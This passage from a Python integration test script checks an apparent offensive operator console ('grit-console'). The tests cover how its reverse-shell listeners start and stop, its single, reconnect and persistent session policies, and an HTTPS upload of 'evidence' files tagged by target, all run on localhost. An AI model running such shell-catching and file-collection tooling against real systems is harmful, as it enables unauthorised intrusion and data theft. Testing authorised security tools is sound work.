        lifecycle_state.write_text(json.dumps(state_after_bind, indent=2) + "\n", encoding="utf-8")
        stale = run(
            "scripts/grit-console", "--config", str(lifecycle_cfg),
            "--state-file", str(lifecycle_state),
            "--staged-file", str(lifecycle_staged),
            "--status",
        )
        if "stale-state" not in stale.stdout:
            print("--status did not warn on stale listening state", file=sys.stderr)
            print(stale.stdout, file=sys.stderr)
            return 1
        stale_json = run(
            "scripts/grit-console", "--config", str(lifecycle_cfg),
            "--state-file", str(lifecycle_state),
            "--staged-file", str(lifecycle_staged),
            "--json-status",
        )
        stale_doc = json.loads(stale_json.stdout)
        stale_warnings = [
            item for item in stale_doc.get("warnings", [])
            if item.get("type") == "stale_state" and item.get("service") == "file-service"
        ]
        if (stale_doc.get("summary", {}).get("stale_count", 0) < 1 or
                not stale_warnings or
                stale_warnings[-1].get("pid") != 999999 or
                stale_warnings[-1].get("configured") != "listening" or
                stale_warnings[-1].get("actual") != "stopped"):
            print("--json-status did not expose structured stale-state warning", file=sys.stderr)
            return 1
        stale_stop = run(
            "scripts/grit-console", "--config", str(lifecycle_cfg),
            "--state-file", str(lifecycle_state),
            "--staged-file", str(lifecycle_staged),
            "--stop",
        )
        if (stale_stop.returncode != 0 or
                "stale pid 999999; marked stopped" not in stale_stop.stdout or
                "Stop summary: stopped=0 skipped=1 failed=0" not in stale_stop.stdout):
            print("--stop did not clean stale PID records", file=sys.stderr)
            print(stale_stop.stdout, file=sys.stderr)
            print(stale_stop.stderr, file=sys.stderr)
            return 1
        stale_clean_doc = json.loads(run(
            "scripts/grit-console", "--config", str(lifecycle_cfg),
            "--state-file", str(lifecycle_state),
            "--staged-file", str(lifecycle_staged),
            "--json-status",
        ).stdout)
        stale_clean_state = stale_clean_doc.get("server_state", {}).get("services", {}).get("file-service") or {}
        if (stale_clean_state.get("status") != "stopped" or
                stale_clean_state.get("pid") or
                stale_clean_state.get("managed_by") or
                not stale_clean_state.get("stopped_at")):
            print("--stop stale PID cleanup left misleading ownership fields", file=sys.stderr)
            print(json.dumps(stale_clean_doc, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        events_after_stale_stop = [
            json.loads(line) for line in lifecycle_events_path.read_text(encoding="utf-8").splitlines()
        ]
        stale_cleanup_events = [
            event for event in events_after_stale_stop
            if event.get("service") == "file-service"
            and event.get("event") == "service_stop"
            and event.get("details", {}).get("reason") == "stale-pid"
        ]
        if not stale_cleanup_events:
            print("--stop did not log stale PID cleanup event", file=sys.stderr)
            return 1

        sigint_port = free_port()
        sigint_cfg = Path(tmp) / "server-config-sigint.json"
        sigint_state = Path(tmp) / "operator-session" / "sigint-state.json"
        sigint_staged = Path(tmp) / "operator-session" / "sigint-staged.json"
        sigint_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "GRIT_OPERATOR_FILE_SERVICE_PORT": sigint_port,
            "session_root": str(Path(tmp) / "sessions-sigint"),
            "tls_cert": str(cert_path),
            "tls_key": str(key_path),
            "GRIT_OPERATOR_FILE_SERVICE_TLS": "no",
            "operator_session_dir": str(Path(tmp) / "operator-session"),
        }), encoding="utf-8")
        sigint_proc = subprocess.Popen(
            [
                str(server), "--config", str(sigint_cfg),
                "--state-file", str(sigint_state),
                "--staged-file", str(sigint_staged),
                "--transport", "file-service",
                "--file-service-tls", "no",
                "--timeout", "30",
            ],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        deadline = time.time() + 5
        while time.time() < deadline:
            sigint_status = run(
                "scripts/grit-console", "--config", str(sigint_cfg),
                "--state-file", str(sigint_state),
                "--staged-file", str(sigint_staged),
                "--json-status",
            )
            if sigint_status.returncode == 0:
                rows = {row["name"]: row for row in json.loads(sigint_status.stdout)["services"]}
                if rows["file-service"]["actual"] == "listening":
                    break
            time.sleep(0.05)
        else:
            print("SIGINT lifecycle file-service did not reach listening state", file=sys.stderr)
            sigint_proc.terminate()
            sigint_proc.communicate(timeout=2)
            return 1
        sigint_proc.send_signal(signal.SIGINT)
        sigint_stdout, sigint_stderr = sigint_proc.communicate(timeout=5)
        sigint_combined = sigint_stdout + sigint_stderr
        if sigint_proc.returncode not in (0, 130) or "Traceback" in sigint_combined:
            print("SIGINT foreground listener did not exit cleanly", file=sys.stderr)
            print(sigint_combined, file=sys.stderr)
            return 1
        sigint_after = run(
            "scripts/grit-console", "--config", str(sigint_cfg),
            "--state-file", str(sigint_state),
            "--staged-file", str(sigint_staged),
            "--json-status",
        )
        sigint_after_doc = json.loads(sigint_after.stdout)
        sigint_rows = {row["name"]: row for row in sigint_after_doc["services"]}
        if sigint_rows["file-service"]["actual"] == "listening" or sigint_rows["file-service"]["configured"] != "stopped":
            print("SIGINT foreground listener did not stop and release its port", file=sys.stderr)
            print(sigint_after.stdout, file=sys.stderr)
            return 1
        sigint_state_rec = sigint_after_doc.get("server_state", {}).get("services", {}).get("file-service") or {}
        if (sigint_state_rec.get("stopped_reason") != "SIGINT" or
                sigint_rows["file-service"].get("stopped_reason") != "SIGINT" or
                not sigint_state_rec.get("stopped_at")):
            print("SIGINT foreground listener did not preserve stopped reason in status", file=sys.stderr)
            print(sigint_after.stdout, file=sys.stderr)
            return 1
        sigint_events_path = Path(tmp) / "operator-session" / "events.jsonl"
        sigint_events = [json.loads(line) for line in sigint_events_path.read_text(encoding="utf-8").splitlines()]
        sigint_shutdowns = [
            event for event in sigint_events
            if event.get("service") == "file-service"
            and event.get("event") == "shutdown"
            and event.get("details", {}).get("reason") == "SIGINT"
        ]
        if not sigint_shutdowns:
            print("SIGINT foreground listener did not record structured shutdown event", file=sys.stderr)
            return 1

        sigterm_port = free_port()
        sigterm_cfg = Path(tmp) / "server-config-sigterm.json"
        sigterm_state = Path(tmp) / "operator-session" / "sigterm-state.json"
        sigterm_staged = Path(tmp) / "operator-session" / "sigterm-staged.json"
        sigterm_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "GRIT_OPERATOR_FILE_SERVICE_PORT": sigterm_port,
            "session_root": str(Path(tmp) / "sessions-sigterm"),
            "tls_cert": str(cert_path),
            "tls_key": str(key_path),
            "GRIT_OPERATOR_FILE_SERVICE_TLS": "no",
            "operator_session_dir": str(Path(tmp) / "operator-session"),
        }), encoding="utf-8")
        sigterm_proc = subprocess.Popen(
            [
                str(server), "--config", str(sigterm_cfg),
                "--state-file", str(sigterm_state),
                "--staged-file", str(sigterm_staged),
                "--transport", "file-service",
                "--file-service-tls", "no",
                "--timeout", "30",
            ],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        deadline = time.time() + 5
        while time.time() < deadline:
            sigterm_status = run(
                "scripts/grit-console", "--config", str(sigterm_cfg),
                "--state-file", str(sigterm_state),
                "--staged-file", str(sigterm_staged),
                "--json-status",
            )
            if sigterm_status.returncode == 0:
                rows = {row["name"]: row for row in json.loads(sigterm_status.stdout)["services"]}
                if rows["file-service"]["actual"] == "listening":
                    break
            time.sleep(0.05)
        else:
            print("SIGTERM lifecycle file-service did not reach listening state", file=sys.stderr)
            sigterm_proc.terminate()
            sigterm_proc.communicate(timeout=2)
            return 1
        sigterm_proc.terminate()
        sigterm_stdout, sigterm_stderr = sigterm_proc.communicate(timeout=5)
        sigterm_combined = sigterm_stdout + sigterm_stderr
        if sigterm_proc.returncode not in (0, 143, -signal.SIGTERM) or "Traceback" in sigterm_combined:
            print("SIGTERM foreground listener did not exit cleanly", file=sys.stderr)
            print(sigterm_combined, file=sys.stderr)
            return 1
        sigterm_after = run(
            "scripts/grit-console", "--config", str(sigterm_cfg),
            "--state-file", str(sigterm_state),
            "--staged-file", str(sigterm_staged),
            "--json-status",
        )
        sigterm_after_doc = json.loads(sigterm_after.stdout)
        sigterm_rows = {row["name"]: row for row in sigterm_after_doc["services"]}
        sigterm_state_rec = sigterm_after_doc.get("server_state", {}).get("services", {}).get("file-service") or {}
        if (sigterm_rows["file-service"]["actual"] == "listening" or
                sigterm_rows["file-service"]["configured"] != "stopped" or
                sigterm_state_rec.get("stopped_reason") != "SIGTERM" or
                sigterm_rows["file-service"].get("stopped_reason") != "SIGTERM" or
                not sigterm_state_rec.get("stopped_at")):
            print("SIGTERM foreground listener did not stop and preserve stopped reason", file=sys.stderr)
            print(sigterm_after.stdout, file=sys.stderr)
            return 1
        sigterm_events = [json.loads(line) for line in sigint_events_path.read_text(encoding="utf-8").splitlines()]
        sigterm_shutdowns = [
            event for event in sigterm_events
            if event.get("service") == "file-service"
            and event.get("event") == "shutdown"
            and event.get("details", {}).get("reason") == "SIGTERM"
        ]
        if not sigterm_shutdowns:
            print("SIGTERM foreground listener did not record structured shutdown event", file=sys.stderr)
            return 1

        single_shell_port = free_port()
        single_shell_cfg = Path(tmp) / "server-config-single-shell.json"
        single_shell_state = Path(tmp) / "operator-session" / "single-shell-state.json"
        single_shell_staged = Path(tmp) / "operator-session" / "single-shell-staged.json"
        single_shell_operator_dir = Path(tmp) / "operator-session-single-shell"
        single_shell_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "GRIT_RSHELL_SOCAT_PORT": single_shell_port,
            "GRIT_RSHELL_SESSION_POLICY": "single",
            "session_root": str(Path(tmp) / "sessions-single-shell"),
            "operator_session_dir": str(single_shell_operator_dir),
        }), encoding="utf-8")
        single_shell_label = run(
            "scripts/grit-console", "--config", str(single_shell_cfg),
            "--set-target-label", "target-shell",
            "--target-label", "Shell Router",
        )
        if single_shell_label.returncode != 0:
            print("single rshell target label setup failed", file=sys.stderr)
            print(single_shell_label.stdout, file=sys.stderr)
            print(single_shell_label.stderr, file=sys.stderr)
            return 1
        single_shell_proc = subprocess.Popen(
            [
                str(server), "--config", str(single_shell_cfg),
                "--state-file", str(single_shell_state),
                "--staged-file", str(single_shell_staged),
                "--target-id", "target-shell",
                "--transport", "plain-shell",
                "--no-stdin",
                "--timeout", "30",
            ],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        deadline = time.time() + 5
        while time.time() < deadline:
            status = run(
                "scripts/grit-console", "--config", str(single_shell_cfg),
                "--state-file", str(single_shell_state),
                "--staged-file", str(single_shell_staged),
                "--json-status",
            )
            if status.returncode == 0:
                rows = {row["name"]: row for row in json.loads(status.stdout)["services"]}
                if rows["plain-shell"]["actual"] == "listening":
                    break
            time.sleep(0.05)
        else:
            print("single rshell policy listener did not reach listening state", file=sys.stderr)
            single_shell_proc.terminate()
            single_shell_proc.communicate(timeout=2)
            return 1
        with socket.create_connection(("127.0.0.1", single_shell_port), timeout=5) as sock:
            sock.sendall(b"single-policy-session\n")
        single_stdout, single_stderr = single_shell_proc.communicate(timeout=5)
        if (single_shell_proc.returncode != 0 or
                "single-policy-session" not in single_stdout or
                "session_policy=single stops after first successful session" not in single_stdout or
                "Traceback" in (single_stdout + single_stderr)):
            print("single rshell session policy did not stop cleanly after one session", file=sys.stderr)
            print(single_stdout, file=sys.stderr)
            print(single_stderr, file=sys.stderr)
            return 1
        single_after = json.loads(run(
            "scripts/grit-console", "--config", str(single_shell_cfg),
            "--state-file", str(single_shell_state),
            "--staged-file", str(single_shell_staged),
            "--json-status",
        ).stdout)
        single_rows = {row["name"]: row for row in single_after["services"]}
        single_state_rec = single_after.get("server_state", {}).get("services", {}).get("plain-shell") or {}
        if (single_rows["plain-shell"]["actual"] == "listening" or
                single_rows["plain-shell"]["configured"] != "stopped" or
                single_state_rec.get("stopped_reason") != "remote_eof"):
            print("single rshell session policy left listener active or state misleading", file=sys.stderr)
            print(json.dumps(single_after, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        single_events = [
            json.loads(line) for line in (single_shell_operator_dir / "events.jsonl").read_text(encoding="utf-8").splitlines()
        ]
        if not any(event.get("event") == "shell_listener_policy_stop" and event.get("details", {}).get("session_policy") == "single" for event in single_events):
            print("single rshell session policy did not write policy stop event", file=sys.stderr)
            return 1
        single_shell_session = next((rec for rec in single_after.get("sessions") or [] if rec.get("service") == "plain-shell"), {})
        single_shell_target = (single_after.get("targets_by_id") or {}).get("target-shell") or {}
        single_shell_target_events = [
            event for event in single_events
            if event.get("details", {}).get("target_id") == "target-shell"
        ]
        if (single_shell_session.get("target_id") != "target-shell" or
                single_shell_session.get("target_label") != "Shell Router" or
                single_shell_target.get("label") != "Shell Router" or
                "plain-shell" not in (single_shell_target.get("services_seen") or []) or
                single_shell_target.get("latest_session_id") != single_shell_session.get("session_id") or
                not any(event.get("event") == "shell_connected" for event in single_shell_target_events) or
                not any(event.get("event") == "shell_listener_policy_stop" for event in single_shell_target_events)):
            print("target-scoped rshell session/event records were not captured", file=sys.stderr)
            print(json.dumps(single_after, indent=2, sort_keys=True), file=sys.stderr)
            return 1
        single_shell_filtered = json.loads(run(
            "scripts/grit-console", "--config", str(single_shell_cfg),
            "--state-file", str(single_shell_state),
            "--staged-file", str(single_shell_staged),
            "--target-id", "target-shell",
            "--json-status",
        ).stdout)
        if (single_shell_filtered.get("target_filter", {}).get("active") is not True or
                single_shell_filtered.get("summary", {}).get("target_count") != 1 or
                single_shell_filtered.get("summary", {}).get("session_count") != 1 or
                (single_shell_filtered.get("sessions") or [{}])[0].get("target_id") != "target-shell" or
                not any((event.get("details") or {}).get("target_id") == "target-shell" for event in single_shell_filtered.get("events") or [])):
            print("target-filtered rshell status did not retain scoped session/events", file=sys.stderr)
            print(json.dumps(single_shell_filtered, indent=2, sort_keys=True), file=sys.stderr)
            return 1

        reconnect_shell_port = free_port()
        reconnect_shell_cfg = Path(tmp) / "server-config-reconnect-shell.json"
        reconnect_shell_state = Path(tmp) / "operator-session" / "reconnect-shell-state.json"
        reconnect_shell_staged = Path(tmp) / "operator-session" / "reconnect-shell-staged.json"
        reconnect_shell_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "GRIT_RSHELL_SOCAT_PORT": reconnect_shell_port,
            "GRIT_RSHELL_SESSION_POLICY": "reconnect",
            "session_root": str(Path(tmp) / "sessions-reconnect-shell"),
            "operator_session_dir": str(Path(tmp) / "operator-session-reconnect-shell"),
        }), encoding="utf-8")
        reconnect_shell_proc = subprocess.Popen(
            [
                str(server), "--config", str(reconnect_shell_cfg),
                "--state-file", str(reconnect_shell_state),
                "--staged-file", str(reconnect_shell_staged),
                "--transport", "plain-shell",
                "--no-stdin",
                "--timeout", "30",
            ],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        deadline = time.time() + 5
        while time.time() < deadline:
            status = run(
                "scripts/grit-console", "--config", str(reconnect_shell_cfg),
                "--state-file", str(reconnect_shell_state),
                "--staged-file", str(reconnect_shell_staged),
                "--json-status",
            )
            if status.returncode == 0:
                rows = {row["name"]: row for row in json.loads(status.stdout)["services"]}
                if rows["plain-shell"]["actual"] == "listening":
                    break
            time.sleep(0.05)
        else:
            print("reconnect rshell policy listener did not reach listening state", file=sys.stderr)
            reconnect_shell_proc.terminate()
            reconnect_shell_proc.communicate(timeout=2)
            return 1
        with socket.create_connection(("127.0.0.1", reconnect_shell_port), timeout=5) as sock:
            sock.sendall(b"reconnect-policy-session\n")
        deadline = time.time() + 5
        while time.time() < deadline:
            reconnect_status = run(
                "scripts/grit-console", "--config", str(reconnect_shell_cfg),
                "--state-file", str(reconnect_shell_state),
                "--staged-file", str(reconnect_shell_staged),
                "--json-status",
            )
            if reconnect_status.returncode == 0:
                reconnect_doc = json.loads(reconnect_status.stdout)
                rows = {row["name"]: row for row in reconnect_doc["services"]}
                if rows["plain-shell"]["actual"] == "listening" and rows["plain-shell"]["configured"] == "listening":
                    break
            time.sleep(0.05)
        else:
            print("reconnect rshell policy did not keep listener open after disconnect", file=sys.stderr)
            reconnect_shell_proc.terminate()
            reconnect_shell_proc.communicate(timeout=2)
            return 1
        reconnect_shell_proc.terminate()
        reconnect_stdout, reconnect_stderr = reconnect_shell_proc.communicate(timeout=5)
        if ("reconnect-policy-session" not in reconnect_stdout or
                "listener remains open for target retry/reconnect" not in reconnect_stdout or
                "session_policy=reconnect stops after first successful session" in reconnect_stdout or
                "Traceback" in (reconnect_stdout + reconnect_stderr)):
            print("reconnect rshell session policy did not preserve reconnect listener behavior", file=sys.stderr)
            print(reconnect_stdout, file=sys.stderr)
            print(reconnect_stderr, file=sys.stderr)
            return 1

        persistent_shell_port = free_port()
        persistent_shell_cfg = Path(tmp) / "server-config-persistent-shell.json"
        persistent_shell_state = Path(tmp) / "operator-session" / "persistent-shell-state.json"
        persistent_shell_staged = Path(tmp) / "operator-session" / "persistent-shell-staged.json"
        persistent_operator_dir = Path(tmp) / "operator-session-persistent-shell"
        persistent_shell_cfg.write_text(json.dumps({
            "listen_host": "127.0.0.1",
            "GRIT_RSHELL_SOCAT_PORT": persistent_shell_port,
            "GRIT_RSHELL_SESSION_POLICY": "persistent",
            "session_root": str(Path(tmp) / "sessions-persistent-shell"),
            "operator_session_dir": str(persistent_operator_dir),
        }), encoding="utf-8")
        persistent_shell_proc = subprocess.Popen(
            [
                str(server), "--config", str(persistent_shell_cfg),
                "--state-file", str(persistent_shell_state),
                "--staged-file", str(persistent_shell_staged),
                "--transport", "plain-shell",
                "--no-stdin",
                "--timeout", "30",
            ],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        deadline = time.time() + 5
        while time.time() < deadline:
            status = run(
                "scripts/grit-console", "--config", str(persistent_shell_cfg),
                "--state-file", str(persistent_shell_state),
                "--staged-file", str(persistent_shell_staged),
                "--json-status",
            )
            if status.returncode == 0:
                rows = {row["name"]: row for row in json.loads(status.stdout)["services"]}
                if rows["plain-shell"]["actual"] == "listening":
                    break
            time.sleep(0.05)
        else:
            print("persistent rshell policy listener did not reach listening state", file=sys.stderr)
            persistent_shell_proc.terminate()
            persistent_shell_proc.communicate(timeout=2)
            return 1
        for idx in (1, 2):
            with socket.create_connection(("127.0.0.1", persistent_shell_port), timeout=5) as sock:
                sock.sendall(f"persistent-policy-session-{idx}\n".encode("ascii"))
            deadline = time.time() + 5
            while time.time() < deadline:
                persistent_status = run(
                    "scripts/grit-console", "--config", str(persistent_shell_cfg),
                    "--state-file", str(persistent_shell_state),
                    "--staged-file", str(persistent_shell_staged),
                    "--json-status",
                )
                if persistent_status.returncode == 0:
                    persistent_doc = json.loads(persistent_status.stdout)
                    rows = {row["name"]: row for row in persistent_doc["services"]}
                    if rows["plain-shell"]["actual"] == "listening" and rows["plain-shell"]["configured"] == "listening":
                        break
                time.sleep(0.05)
            else:
                print(f"persistent rshell policy did not keep listener open after session {idx}", file=sys.stderr)
                persistent_shell_proc.terminate()
                persistent_shell_proc.communicate(timeout=2)
                return 1
        persistent_shell_proc.terminate()
        persistent_stdout, persistent_stderr = persistent_shell_proc.communicate(timeout=5)
        if ("persistent-policy-session-1" not in persistent_stdout or
                "persistent-policy-session-2" not in persistent_stdout or
                persistent_stdout.count("listener remains open for target retry/reconnect") < 2 or
                "session_policy=persistent stops after first successful session" in persistent_stdout or
                "Traceback" in (persistent_stdout + persistent_stderr)):
            print("persistent rshell session policy did not preserve persistent listener behavior", file=sys.stderr)
            print(persistent_stdout, file=sys.stderr)
            print(persistent_stderr, file=sys.stderr)
            return 1
        persistent_after = json.loads(run(
            "scripts/grit-console", "--config", str(persistent_shell_cfg),
            "--state-file", str(persistent_shell_state),
            "--staged-file", str(persistent_shell_staged),
            "--json-status",
        ).stdout)
        persistent_session = next((rec for rec in persistent_after.get("sessions") or [] if rec.get("service") == "plain-shell"), {})
        persistent_details = persistent_session.get("details") or {}
        persistent_events = [
            json.loads(line) for line in (persistent_operator_dir / "events.jsonl").read_text(encoding="utf-8").splitlines()
        ]
        if (persistent_details.get("session_policy") != "persistent" or
                sum(1 for event in persistent_events if event.get("event") == "shell_connected") < 2 or
                sum(1 for event in persistent_events if event.get("event") == "shell_disconnected") < 2 or
                any(event.get("event") == "shell_listener_policy_stop" for event in persistent_events)):
            print("persistent rshell session metadata/events did not show repeated fresh sessions", file=sys.stderr)
            print(json.dumps(persistent_after, indent=2, sort_keys=True), file=sys.stderr)
            return 1

        unmanaged_state = {
            "schema": 1,
            "services": {
                "file-service": {
                    "status": "listening",
                    "pid": os.getpid(),
                    "listen_host": "127.0.0.1",
                    "GRIT_OPERATOR_FILE_SERVICE_PORT": lifecycle_port,
                    "updated_at": "unmanaged",
                }
            },
            "sessions": [],
        }
        lifecycle_state.write_text(json.dumps(unmanaged_state, indent=2) + "\n", encoding="utf-8")
        unmanaged_status = run(
            "scripts/grit-console", "--config", str(lifecycle_cfg),
            "--state-file", str(lifecycle_state),
            "--staged-file", str(lifecycle_staged),
            "--json-status",
        )
        unmanaged_doc = json.loads(unmanaged_status.stdout)
        unmanaged_rows = {row["name"]: row for row in unmanaged_doc["services"]}
        unmanaged_warnings = [
            item for item in unmanaged_doc.get("warnings", [])
            if item.get("type") == "unmanaged_recorded_pid" and item.get("service") == "file-service"
        ]
        if (unmanaged_rows["file-service"].get("pid_managed") is not False or
                unmanaged_rows["file-service"].get("ownership_evidence") or
                not unmanaged_warnings or
                unmanaged_warnings[-1].get("pid") != os.getpid() or
                unmanaged_warnings[-1].get("pid_managed") is not False):
            print("--json-status did not expose unmanaged recorded PID warning", file=sys.stderr)
            return 1
        unmanaged_stop = run(
            "scripts/grit-console", "--config", str(lifecycle_cfg),
            "--state-file", str(lifecycle_state),
            "--staged-file", str(lifecycle_staged),
            "--stop",
        )
        if (unmanaged_stop.returncode != 0 or
                "skipped pid" not in unmanaged_stop.stdout or
                "Stop summary: stopped=0 skipped=1 failed=0" not in unmanaged_stop.stdout):
            print("--stop did not skip unmanaged live PID", file=sys.stderr)
            print(unmanaged_stop.stdout, file=sys.stderr)
            print(unmanaged_stop.stderr, file=sys.stderr)
            return 1
        unmanaged_after = json.loads(lifecycle_state.read_text(encoding="utf-8"))
        if unmanaged_after["services"]["file-service"].get("status") != "listening":
            print("--stop changed unmanaged live PID state", file=sys.stderr)
            return 1
        unmanaged_events = [
            json.loads(line) for line in lifecycle_events_path.read_text(encoding="utf-8").splitlines()
        ]
        unmanaged_skips = [
            event for event in unmanaged_events
            if event.get("service") == "file-service"
            and event.get("event") == "service_stop_skipped"
            and event.get("details", {}).get("reason") == "unmanaged-pid"
            and event.get("details", {}).get("via") == "server-stop"
        ]
        if not unmanaged_skips:
            print("--stop did not log unmanaged PID skip event", file=sys.stderr)
            return 1

        upload_port = free_port()
        upload_cfg = Path(tmp) / "server-config-upload.json"
        session_root = Path(tmp) / "sessions-upload"
        upload_operator_dir = Path(tmp) / "operator-session-upload"
        upload_cfg.write_text(json.dumps({
            "GRIT_OPERATOR_FILE_SERVICE_ENABLE": "yes",
            "listen_host": "127.0.0.1",
            "GRIT_OPERATOR_FILE_SERVICE_PORT": upload_port,
            "session_root": str(session_root),
            "operator_session_dir": str(upload_operator_dir),
            "server_state": str(upload_operator_dir / "server-state.json"),
            "staged_files": str(upload_operator_dir / "staged-files.json"),
            "tls_cert": str(cert_path),
            "tls_key": str(key_path),
            "GRIT_RSHELL_SESSION_POLICY": "reconnect",
            "GRIT_RSHELL_RETRY_COUNT": "2",
            "GRIT_RSHELL_RETRY_INTERVAL_SEC": "3",
            "GRIT_RSHELL_RETRY_JITTER_PCT": "10",
            "GRIT_RSHELL_RETRY_BACKOFF": "linear",
            "GRIT_RSHELL_RETRY_MAX_INTERVAL_SEC": "8",
        }), encoding="utf-8")
        proc = subprocess.Popen(
            [
                str(server),
                "--config", str(upload_cfg),
                "--file-service",
                "--one-shot",
                "--timeout", "5",
            ],
            cwd=ROOT,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        context = ssl._create_unverified_context()
        payload = b"grit evidence\n"
        request = (
            "PUT /upload/evidence.txt HTTP/1.1\r\n"
            "Host: 127.0.0.1\r\n"
            "X-Grit-Source-Path: /tmp/evidence.txt\r\n"
            "X-Grit-Upload-Kind: evidence\r\n"
            "X-Grit-Target-Id: target-alpha\r\n"
            "X-Grit-Target-Label: Alpha Router\r\n"
            "X-Grit-Target-Alias: lab-alpha\r\n"
            "X-Grit-UID: 0\r\n"
            "X-Grit-GID: 0\r\n"
            "X-Grit-Mode: 0644\r\n"
            f"Content-Length: {len(payload)}\r\n"
            "\r\n"
        ).encode("ascii") + payload
        deadline = time.time() + 5
        response = b""
        while time.time() < deadline:
            try:
                with socket.create_connection(("127.0.0.1", upload_port), timeout=0.5) as raw:
                    with context.wrap_socket(raw, server_hostname="grit") as tls:
                        tls.sendall(request)
                        while True:
                            chunk = tls.recv(65536)
                            if not chunk:
                                break
                            response += chunk
                break
            except (ConnectionRefusedError, TimeoutError, OSError):
                time.sleep(0.05)
        stdout, stderr = proc.communicate(timeout=5)
        if proc.returncode != 0:
            print("file service exited nonzero:", file=sys.stderr)
            print(stdout, file=sys.stderr)
            print(stderr, file=sys.stderr)
            return 1
        if b"HTTP/1.1 200 OK" not in response:
            print("file service did not return HTTP 200:", file=sys.stderr)
            print(response.decode("utf-8", errors="replace"), file=sys.stderr)
            return 1
        uploaded = list(session_root.glob("*/files/evidence.txt"))
        if len(uploaded) != 1 or uploaded[0].read_bytes() != payload:
            print("file service did not store uploaded payload", file=sys.stderr)
            return 1
        metadata_path = uploaded[0].with_name(uploaded[0].name + ".metadata.json")
        metadata = json.loads(metadata_path.read_text(encoding="utf-8"))
        if metadata.get("source_path") != "/tmp/evidence.txt" or metadata.get("upload_kind") != "evidence":
            print("file service metadata missing source path/upload kind", file=sys.stderr)
            return 1
        if metadata.get("size") != len(payload) or metadata.get("transfer_status") != "ok":
            print("file service metadata has wrong size/status", file=sys.stderr)
            return 1
        if len(metadata.get("sha256", "")) != 64:
            print("file service metadata missing sha256", file=sys.stderr)
            return 1
        if (metadata.get("target_id") != "target-alpha" or
                metadata.get("target_label") != "Alpha Router" or
                metadata.get("target_identity_source") != "http-header" or
                metadata.get("target_identity_confidence") != "explicit" or
                "lab-alpha" not in (metadata.get("target_aliases") or [])):
            print("file service metadata missing target identity", file=sys.stderr)
            print(metadata, file=sys.stderr)
            return 1
        upload_sha256 = metadata.get("sha256", "")
        session_json_paths = list(session_root.glob("*/session.json"))
        if len(session_json_paths) != 1:
            print("file service did not write session.json", file=sys.stderr)
            return 1
        session_doc = json.loads(session_json_paths[0].read_text(encoding="utf-8"))
        if (session_doc.get("service") != "file-service" or
                session_doc.get("state") != "stopped" or
                not session_doc.get("session_id") or
                not session_doc.get("uploads") or
                not isinstance(session_doc.get("duration_sec"), int)):
            print("file service session.json missing structured fields", file=sys.stderr)
            print(session_doc, file=sys.stderr)
            return 1
        session_doc["exit_reason"] = "clean shutdown"
        session_json_paths[0].write_text(json.dumps(session_doc, indent=2, sort_keys=True) + "\n", encoding="utf-8")
        session_log_path = session_json_paths[0].parent / "session.log"
        session_log_text = "remote banner\nremote prompt\n"
        session_log_path.write_text(session_log_text, encoding="utf-8")
        session_events = [json.loads(line) for line in (session_json_paths[0].parent / "events.jsonl").read_text(encoding="utf-8").splitlines()]
        event_names = {event.get("event") for event in session_events}
        for expected_event in ("service_start", "connection_open", "upload_start", "upload_complete", "connection_close", "service_stop"):
            if expected_event not in event_names:
                print(f"session events missing {expected_event}", file=sys.stderr)
                return 1
        if any(event.get("session") != session_doc.get("session_id") for event in session_events):
            print("session event records should carry the session id, not an empty/path value", file=sys.stderr)
            return 1
        if any(not event.get("id") or not event.get("session_path") for event in session_events):
            print("session event records should carry stable ids and session paths", file=sys.stderr)
            return 1
        if any(event.get("session_path") != str(session_json_paths[0].parent) for event in session_events):
            print("session event records should carry the exact session path", file=sys.stderr)
            return 1
        if not any(event.get("details", {}).get("target_id") == "target-alpha" for event in session_events):
            print("session event records should carry target_id when supplied", file=sys.stderr)
            return 1
        close_events = [event for event in session_events if event.get("event") == "connection_close"]
        if (not close_events or
                close_events[-1].get("details", {}).get("operation") != "upload" or
                close_events[-1].get("details", {}).get("status") != "ok" or
                close_events[-1].get("details", {}).get("http_status") != 200 or
                close_events[-1].get("details", {}).get("filename") != "evidence.txt"):
            print("file-service connection_close event missing request outcome details", file=sys.stderr)
            return 1
        global_events_path = upload_operator_dir / "events.jsonl"
        global_events = [json.loads(line) for line in global_events_path.read_text(encoding="utf-8").splitlines()]
        if "upload_complete" not in {event.get("event") for event in global_events}:
            print("global operator event log missing upload_complete", file=sys.stderr)
            return 1
        if any(not event.get("id") for event in global_events):
            print("global operator event log entries should carry stable ids", file=sys.stderr)
            return 1
        session_global_events = [
            event for event in global_events
            if event.get("session") == session_doc.get("session_id")
        ]
        if not session_global_events:
            print("global operator event log missing session-correlated events", file=sys.stderr)
            return 1
        upload_state = json.loads((upload_operator_dir / "server-state.json").read_text(encoding="utf-8"))
        if not any(item.get("session_id") == session_doc.get("session_id") for item in upload_state.get("sessions", [])):
            print("server-state sessions missing file-service session id", file=sys.stderr)
            return 1
        upload_status_json = run(
            "scripts/grit-console",
            "--config", str(upload_cfg),
            "--json-status",
        )
        upload_doc = json.loads(upload_status_json.stdout)
        upload_event_stats = upload_doc.get("event_log_stats") or {}
        upload_summary = upload_doc.get("summary") or {}
        targets = upload_doc.get("targets") or []
        targets_by_id = upload_doc.get("targets_by_id") or {}
        target_alpha = targets_by_id.get("target-alpha") or {}
        alpha_workflow_actions = (upload_doc.get("target_workflow_actions_by_target_id") or {}).get("target-alpha") or []
        alpha_actions_by_action = {
            rec.get("action_id"): rec for rec in alpha_workflow_actions
            if isinstance(rec, dict)
        }
        if (upload_doc.get("targets_file") != str(upload_operator_dir / "targets.json") or
                upload_summary.get("target_count") != 1 or
                upload_summary.get("latest_target_id") != "target-alpha" or
                upload_summary.get("target_identity_confidence_counts", {}).get("explicit") != 1 or
